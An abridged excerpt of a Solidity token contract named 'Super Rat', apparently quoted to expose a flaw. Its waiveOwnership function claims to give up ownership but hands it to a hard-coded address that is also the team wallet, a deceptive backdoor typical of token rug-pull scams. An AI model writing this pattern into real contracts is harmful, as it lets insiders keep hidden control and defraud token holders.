...
//https://t.me/SuperRat10
//https://twitter.com/superrat2022
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x53bD1d2c222C84664815deD01412fF7F3988B295);
    }
...
contract SuperRat is Context, IERC20, Ownable {
    ...
    string private _name = "Super Rat";
    string private _symbol = "$SPR$";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x0A1ffA8b1e0aeF16b171263c618cd0227E0c2645);
    address payable private teamWalletAddress = payable(0x53bD1d2c222C84664815deD01412fF7F3988B295);
